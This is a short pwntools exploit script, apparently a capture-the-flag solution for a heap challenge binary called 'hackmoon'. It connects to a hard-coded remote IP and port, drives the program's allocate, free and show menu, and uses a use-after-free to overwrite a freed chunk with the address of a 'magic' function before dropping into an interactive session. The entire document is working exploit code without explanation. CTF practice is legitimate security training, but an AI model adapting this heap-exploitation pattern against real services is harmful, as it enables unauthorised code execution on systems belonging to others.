#! /usr/bin/env python
# -*- coding: utf-8 -*-
# Distributed under terms of the MIT license.
# Author = nepire
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
# n = process('./hackmoon')
n = remote('101.71.29.5',10016)
elf = ELF('./hackmoon')

def choice(idx):
    n.sendlineafter('Your choice :',str(idx))

def new(size,content):
    choice(1)
    n.sendlineafter('moon size :',str(size))
    n.sendlineafter('Content :',content)

def free(idx):
    choice(2)
    n.sendlineafter('Index :',str(idx))

def show(idx):
    choice(3)
    n.sendlineafter('Index :',str(idx))

new(0x18,'aaaa')
new(0x18,'aaaa')
new(0x18,'aaaa')
free(0)
free(1)
new(8,p64(elf.symbols['magic']))
show(0)

n.interactive()
